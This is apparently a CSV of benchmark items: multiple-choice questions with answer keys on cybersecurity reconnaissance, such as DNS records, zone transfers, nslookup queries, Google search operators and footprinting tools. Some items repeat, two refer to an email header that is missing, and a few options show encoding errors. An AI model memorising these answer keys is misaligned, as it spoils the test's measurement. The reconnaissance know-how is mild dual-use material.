index,question,options,answer_key
628,Which of the following methods is described as a way to gather information about potential targets in a neighborhood?,"{'A': 'Installing a sophisticated alarm system.', 'B': 'Leaving lights and TVs on to simulate occupancy.', 'C': 'Driving around the neighborhood to identify promising opportunities.', 'D': 'Using timers for lights to make the house appear lived-in.'}",C
629,Which of the following is mentioned as a method for gathering information about targets before an attack?,"{'A': ""Directly confronting the target's IT department."", 'B': ""Analyzing the target's social media posts for personal details."", 'C': 'Utilizing DNS subtleties and active versus passive reconnaissance.', 'D': ""Physically breaking into the target's office to observe their network setup.""}",C
630,Which of the following is the best explanation for why a tester would send an email to an invalid address within an organization's email system?,"{'A': ""To gather information about internal hosts used in the organization's email system."", 'B': 'To initiate a denial-of-service attack.', 'C': ""To determine an email administrator's contact information."", 'D': ""To test the network's latency.""}",A
631,"Based on the provided email header, which IP address is associated with the 'SOMEONEComputer' originating the email?","{'A': '220.15.10.254', 'B': '158.190.50.254', 'C': '217.88.53.154', 'D': 'The email header does not show this information.'}",C
632,Which DNS record type would you use to advertise both a web server and an FTP server for the same machine as name references?,"{'A': 'NS', 'B': 'SOA', 'C': 'MX', 'D': 'CNAME'}",D
633,Which protocol and port number combination is used by default for DNS zone transfers?,"{'A': 'UDP 53', 'B': 'UDP 161', 'C': 'TCP 53', 'D': 'TCP 22'}",C
634,"Which DNS record type allows for setting restrictions on how long records can stay in cache before being updated, serving as a mitigation against DNS poisoning?","{'A': 'NS', 'B': 'PTR', 'C': 'MX', 'D': 'SOA'}",D
635,Which tool is used to extract usable metadata from PDF files found on a target's website?,"{'A': 'Shodan', 'B': 'Metagoofil', 'C': 'Maltego', 'D': 'Whois'}",B
636,What is a primary service provided by the U.S. Computer Security Incident Response Team (CSIRT)?,"{'A': 'CSIRT provides an incident response service to enable a reliable and trusted single point of contact for reporting computer security incidents worldwide.', 'B': 'CSIRT provides a computer security surveillance service to supply the government with important intelligence information on individuals traveling abroad.', 'C': 'CSIRT provides a penetration testing service to support exception reporting on incidents worldwide by individuals and multinational corporations.', 'D': 'CSIRT provides a vulnerability assessment service to assist law enforcement agencies with profiling an individualâ€™s property or companyâ€™s assets.'}",A
637,Which nslookup command sequence is best for discovering the operating system and CPU type of ATARGET_SYSTEM using the ADNS_SERVER?,"{'A': '> server ADNS_SERVER\n> set type=HINFO\n> ATARGET_SYSTEM', 'B': '> server ATARGET_SYSTEM\n> set type=HINFO\n> ADNS_SERVER', 'C': '> server ADNS_SERVER\n> set ATARGET_SYSTEM\n> type=HINFO', 'D': '> server type=HINFO\n> set ADNS_SERVER\n> ATARGET_SYSTEM'}",A
638,A test member sends an email to an invalid address within an organization. What is the primary motivation for this action in a cybersecurity context?,"{'A': ""To gather information about internal hosts used in the organization's email system."", 'B': ""To initiate a denial-of-service attack on the organization's network."", 'C': 'To obtain contact information for an email administrator.', 'D': 'To discover how email systems handle incorrectly addressed messages.'}",A
639,Which IP address represents the true originator of the email based on the provided headers?,"{'A': '220.15.10.254', 'B': '158.190.50.254', 'C': '217.88.53.154', 'D': 'The email header does not show this information.'}",C
640,"Which Google search operator is best suited for finding pages with ""CEH"" and ""V11"" in their title?","{'A': 'inurl:CEH inurl:V11', 'B': 'allintitle:CEH V11', 'C': 'intitle:CEH inurl:V11', 'D': 'allinurl:CEH V11'}",B
641,Which command is used on Windows systems to trace the path to a specific IP address by sending ICMP packets with incrementing TTL values?,"{'A': 'ping', 'B': 'ifconfig', 'C': 'netstat', 'D': 'tracert'}",D
642,Which of the following is considered an example of passive reconnaissance?,"{'A': ""Calling the company's help desk line"", 'B': 'Actively injecting packets into a network', 'C': 'Talking to people in a parking lot', 'D': 'Checking job listings for the company'}",D
643,"What information does the HINFO record type, as used in the provided command sequence, primarily aim to provide about a host?","{'A': ""The host's IP address and its geographical location."", 'B': 'The type of computer and operating system used by the host.', 'C': 'A list of all services running on the host and their versions.', 'D': 'The current network traffic and bandwidth utilization of the host.'}",B
644,What is the primary benefit of implementing Split DNS for an organization?,"{'A': 'To ensure that DNS results are cryptographically protected.', 'B': 'To automatically update IP addresses for host devices.', 'C': ""To restrict the attacker's footprint by separating internal and external DNS servers."", 'D': 'To allow dynamic updates of DNS records for a domain name.'}",C
645,"Which DNS record type would you use to create an alias for a host, allowing multiple service names to point to a single server?","{'A': 'NS (Name Server)', 'B': 'SOA (Start of Authority)', 'C': 'MX (Mail Exchanger)', 'D': 'CNAME (Canonical Name)'}",D
646,Which of the following is a helpful measure in protecting a public-facing DNS server from unwanted enumeration?,"{'A': 'Allowing zone transfers to any requesting server.', 'B': 'Ensuring there are no A records for internal hosts on the public-facing name server.', 'C': 'Changing the preference number on all MX records to zero.', 'D': 'Disabling all DNS queries to the public-facing name server.'}",B
647,"According to the provided text, which of the following actions is considered passive footprinting?","{'A': ""Searching the client's job postings."", 'B': ""Visiting the client's dumpster."", 'C': ""Accessing the client's network to gather information."", 'D': ""Attempting to log into the client's systems.""}",A
648,Which protocol and port number combination is used by default for DNS zone transfers?,"{'A': 'UDP 53', 'B': 'UDP 161', 'C': 'TCP 53', 'D': 'TCP 22'}",C
649,"What type of mode is initiated when you type `nslookup` and press enter, followed by a prompt for further commands?","{'A': 'Non-interactive mode', 'B': 'Interactive mode', 'C': 'Query mode', 'D': 'Default mode'}",B
650,"A user connects to their company's website via VPN from home and finds the site appears normal, even though it's not functioning as expected for them. The company's DNS server is being used instead of their local resolution. What type of attack might explain this issue, where an attacker manipulates DNS records to redirect traffic?","{'A': 'SQL Injection', 'B': 'ARP Poisoning', 'C': 'DNS Poisoning', 'D': 'Router Poisoning'}",C
651,"Which DNS record type allows for the restriction of how long records stay in cache before they are updated, potentially mitigating DNS poisoning?","{'A': 'NS', 'B': 'PTR', 'C': 'MX', 'D': 'SOA'}",D
652,What is a significant advantage of having Directory-integrated DNS servers in a Windows Active Directory network?,"{'A': 'They primarily handle external name resolution requests delegated to an ISP.', 'B': 'They allow any authoritative DNS server to be designated as a secondary source for zone updates.', 'C': 'They utilize a multimaster update model where updates are conducted based on the Active Directory database.', 'D': 'They offer faster and more efficient zone replication compared to standard DNS replication.'}",C
653,Which of the following is a valuable resource for obtaining publicly filed financial and historical information about publicly traded companies?,"{'A': 'SpiderFoot', 'B': 'EDGAR Database', 'C': 'Sam Spade', 'D': 'Pipl.com'}",B
654,What method does traceroute use to map routes traveled by a packet?,"{'A': 'By carrying a hello packet in the payload, forcing the host to respond', 'B': 'By using DNS queries at each hop', 'C': 'By manipulating the time to live (TTL) parameter', 'D': 'By using ICMP Type 5, Code 0 packets'}",C
655,Which tool is used to extract usable metadata from documents like PDF files?,"{'A': 'Shodan', 'B': 'Maltego', 'C': 'Metagoofil', 'D': 'Whois'}",C
656,"Which DNS record type is used to map an IP address to a hostname, commonly for reverse DNS lookups?","{'A': 'MX (Mail Exchange)', 'B': 'CNAME (Canonical Name)', 'C': 'PTR (Pointer)', 'D': 'NS (Name Server)'}",C
657,"A colleague enters the following into a Google search string: intitle:intranet inurl:intranet intext:""finance"". Which of the following statements is most correct concerning this attempt?","{'A': 'The search engine will respond with all pages having the word intranet in the title and in the URL, and with finance in the text.', 'B': 'The search engine will not respond with any results because you cannot combine Google hacks in one line.', 'C': 'The search engine will respond with all pages having the word intranet in the title and finance in the URL.', 'D': 'The search engine will respond with all pages having the word intranet in the URL and finance in the title.'}",A
658,Where can Amanda go to see past versions and pages of a website?,"{'A': 'Search.com', 'B': 'Google cache', 'C': 'PastHash.com', 'D': 'Archive.org'}",D
659,Which of the following is a primary service of the U.S. Computer Security Incident Response Team (CSIRT)?,"{'A': 'CSIRT provides an incident response service to enable a reliable and trusted single point of contact for reporting computer security incidents worldwide.', 'B': 'CSIRT provides a computer security surveillance service to supply the government with important intelligence information on individuals traveling abroad.', 'C': 'CSIRT provides a penetration testing service to support exception reporting on incidents worldwide by individuals and multinational corporations.', 'D': 'CSIRT provides a vulnerability assessment service to assist law enforcement agencies with profiling an individualâ€™s property or companyâ€™s asset.'}",A
